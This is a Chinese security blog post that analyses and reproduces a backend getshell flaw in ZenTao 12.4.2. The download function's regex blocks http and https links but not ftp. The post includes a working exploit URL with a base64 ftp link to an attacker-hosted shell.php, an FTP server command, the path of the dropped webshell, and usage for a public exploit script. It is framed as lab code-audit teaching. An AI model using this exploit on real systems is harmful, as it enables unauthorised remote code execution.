> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9j3bGmeELuXs2DeLj22faA)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb6CNdhNAz8EQVcsbRicibC0LXyY17KBcSzaQAqCgf1mpBDAJvTpy2XVWuY7kb7kibuc6N3j8fHvmfkEQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvyyjt1GfHLaqE7wPAcicNCKgOmHHy9U3mdC6sqcXpSZMtt7NQOLxzJxA/640?wx_fmt=png)

前记

本文将对禅道 12.4.2 后台 getshell 漏洞进行分析，距离该版本上线已经过去 2 个多月，本漏洞会对 12.4.2 之前的版本产生影响，目前已经在新版本中修复。在复现该漏洞的时候我也读过一些网上对于该漏洞复现的文章，但是通过反复测试我发现网上所述的方法在我的环境上并不能成功复现，不知是否有情况相同的小伙伴，所以我对于漏洞点进行了审计，并成功复现，下面我们一起来分析一下。

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvyyjt1GfHLaqE7wPAcicNCKgOmHHy9U3mdC6sqcXpSZMtt7NQOLxzJxA/640?wx_fmt=png)

代码分析

首先该漏洞需要后台管理员权限，所以我们首先登陆至后台。通过下图我们可以看到登陆后的界面 URL 为：  
http://192.168.52.141/zentaopms/www/index.php?m=my&f=index

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6CNdhNAz8EQVcsbRicibC0LXDuRX7rRbs5N9fe8nIY0O6Fy8Wh84WNfMpUtVoOQbwLTv8YZEnO3gcg/640?wx_fmt=png)

我们看到后台界面分别对 m 以及 f 参数进行传参，那么不难猜出大概就是调用 my 类下的 index 方法，我们看一下该段的代码。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6CNdhNAz8EQVcsbRicibC0LXgpA9mqfEZHiaqFa5GbFUX7xWQ0ZCic0l9ou0HTDop92m6JSP38XKwp7w/640?wx_fmt=png)

在 / module/my/lang/zh-cn.php 下可以看到存在指向 index 的方法，这验证了我们上面猜测是正确的，那么我们下面来看一下文件下载漏洞点的代码部分。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6CNdhNAz8EQVcsbRicibC0LXxgic3IdptvMWDlRbo2ndIVQaaPmBX6dib1GlqXsNice7yOVcxAwuxpk4g/640?wx_fmt=png)

漏洞是发生在 client 类下的 donwload 函数中，我们定位函数至 / module/client/control.php 中找到该方法，本段代码大致意思就是会接收三个参数 version、os、link，然后去调用 downloadZipPackage 方法进行文件下载操作，并对一些下载失败事件进行不同回显，比如 downloadFail，saveClientError 在上图的方法列表我们可以看到他们调用的方法的具体含义，这里就不再赘述，最后如果没有失败事件时间就会返回成功。在 downloadZipPackage 并不需要 os 方法，所以这在我们后期利用时也不需要传入该参数。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6CNdhNAz8EQVcsbRicibC0LXEY2LzWQbV4odV5TYcm6kua8TYYt7waAvkYYpK8z3icb0K42KIEWfQDQ/640?wx_fmt=png)

然后继续跟进 downloadZipPackage 方法中，注意重点来了，漏洞真正的产生原因就在该方法中。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6CNdhNAz8EQVcsbRicibC0LXgWb4PIoNo2DjJWyQMHBQYQVlKsBpyyKC8bATgibYAia4bnzZp8pPuvsw/640?wx_fmt=png)

我们可以看到这段代码首先对传入的 link 参数进行了 base64 解码操作，这里的 link 参数就是我们 shell 的远程地址，然后下面会通过一个正则表达式进行判断，link 地址是否以 http:// 或者 https:// 开头，如果存在则 return 返回 false 并退出方法，否则调用方法 parent::downloadZipPackage，这里其实忽略了 FTP 这一文件下载方法，也就是说我们可以通过 FTP 服务代替进行文件下载操作从而绕过正则的限制。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6CNdhNAz8EQVcsbRicibC0LX1vuAl6KkDMYEkw51QLJkFnZtEibBqvGF8zjWs9RAeYbtNxn3Jt3fpag/640?wx_fmt=png)

downloadZipPackage 方法就没有什么问题了，就是一段文件下载函数，会通过传入的 version 值创建并命名在 data 下创建的文件夹并将下载的文件保存在其中。

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvyyjt1GfHLaqE7wPAcicNCKgOmHHy9U3mdC6sqcXpSZMtt7NQOLxzJxA/640?wx_fmt=png)

漏洞利用

那么这其实就是很清晰了，通过文章开始介绍的 m 和 f 参数的调用，我们可以对 client 类以及 download 参数进行调用，并传入 download 参数必要的 version 以及 link 参数就可以完成漏洞的利用了。这里的 link 地址是 base64 加密后的 ftp 连接地址，, 比如:

ftp://192.168.52.1/shell.php

大家可以直接使用 python 的 pyftpdlib 模块开启 FTP 服务比较方便，命令:

python -m pyftpdlib -p 21 -d . 默认开启匿名用户，不需要输入用户名密码。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6CNdhNAz8EQVcsbRicibC0LXOXXllj7YViaQMERT6sDHnwLkYpLOh0zO2viamjgPXOv5vaZbDM2MfdEQ/640?wx_fmt=png)

构建 exp 如下:

http://ip/zentaopms/www/index.php?m=client&f=download&version=1&link=ZnRwOi8vMTkyLjE2OC41Mi4xL3NoZWxsLnBocA==

可以看到回显弹窗保存成功，然后再到靶机中查看发现下载成功，保存路径至

/zentaopms/www/data/client/1/shell.php

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6CNdhNAz8EQVcsbRicibC0LXIufJibibUHZYwp1DTscZVibugpVwmib2p6xBHywQnIhAoxDk5pWmMEbDmA/640?wx_fmt=png)

连接木马，成功利用！

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6CNdhNAz8EQVcsbRicibC0LXppRAh7PjluyOdibvBibEice5gwr7phDSUe3OOqh4vBCjnRghJJf61tKbg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvyyjt1GfHLaqE7wPAcicNCKgOmHHy9U3mdC6sqcXpSZMtt7NQOLxzJxA/640?wx_fmt=png)

漏洞利用 EXP

所以本文最突出的一个部分来了，就是我们有 EXP 啊。通过两个夜晚的努力，终于完成了，其中也碰到了不少坑，但是好在都解决了。下面由我来介绍一下他的使用方法吧。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6CNdhNAz8EQVcsbRicibC0LX3SqjvceXZmwW8CztcONq5KDqSFQiaxBdiaw6HTSUnxIownEicDtNp9bEg/640?wx_fmt=png)

构建命令: python "Zentao RCE EXP.py" -H http://192.168.52.141 -U admin -P Admin888 -f 192.168.52.1

其中 - H 指定目标主机，-U 指定后台用户名，-P 指定密码，-f 指定 VMnet8 网卡的 IP，这样虚拟机才能正常访问到物理机的 FTP 服务，当然如果测试环境也在虚拟机中则可以修改源码自动获取 IP 即可，这里是以我的环境为准所以没有这么做，也因为我觉得麻烦一点来换取兼容性更好一点是不亏的，所以小伙伴可以自行修改使用，我想这也不难，源码中也标注了修改位置。目前已经上传至 github，有兴趣的小伙伴可以自行下载测试。

EXP github 地址: https://github.com/wikiZ/Zentao-RCE

![](https://mmbiz.qpic.cn/mmbiz_png/ldFaBNSkvHhfReibVrfKgxN97qcFx3LVvyyjt1GfHLaqE7wPAcicNCKgOmHHy9U3mdC6sqcXpSZMtt7NQOLxzJxA/640?wx_fmt=png)

后记

本文到这里就以接近尾声了，因为最近搭建靶场，也有搭建这个漏洞，所以就想要写一下他的分析与利用这样的一篇文章，随着年龄的增长也越来越喜欢分享知识，以后也会坚持分享，这个漏洞公开并不久，当然我也并不是第一时间就进行分析，本文更加偏向教授代码审计的技巧而不仅仅只是复现，所以也希望能够对大家有所帮助，在测试中有问题的小伙伴可以私信我。最近想要找一份实习的工作 (其实我是看到腾讯在招实习生被香到了)，所以最近相当投入的在沉淀学习哈哈哈。

最后祝大家都能心想事成，美梦成真！

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)

  

- End -  

精彩推荐

[Tomcat 容器攻防笔记之隐匿行踪](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649736482&idx=1&sn=bd12bf1aa97e50b87256bdca7fb1adee&chksm=888cf54dbffb7c5b308e20e86cfabeda083cf24f6edbdeaae162ae7ac3872cc807c2a2f65936&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[巧用 Zeek 在流量层狩猎哥斯拉 Godzilla](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649736430&idx=1&sn=8bc80f154f2414544b02de52c6b68bc9&chksm=888cf481bffb7d97aa5c9ced234abbe5f5eaa6fa243569bdbc050c0f1d1fd2173e6294b466a8&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[入侵检测系列 1（中）基于私有协议的加密流量分析思路（Teamviewer 篇）](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649736371&idx=1&sn=e397ff5934fd08294daa26ad07ba7260&chksm=888cf4dcbffb7dca9cc25b9c49ed48bea2a3a725b66507505c808a0f73e415cf59149d694484&scene=21#wechat_redirect)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[笑着走向终结：Flash 喜迎最后一次更新](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649736292&idx=1&sn=1bbd47d850249298d575c279cd6cc5e1&chksm=888cf40bbffb7d1de50882015ce77fc31f2ef40c31ff0611d70dd15677701351a8952da6ecc7&scene=21#wechat_redirect)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif)  

---------------------------------------------------------------------------------------------------------------------------------------------------

**戳 “阅读原文” 查看更多内容**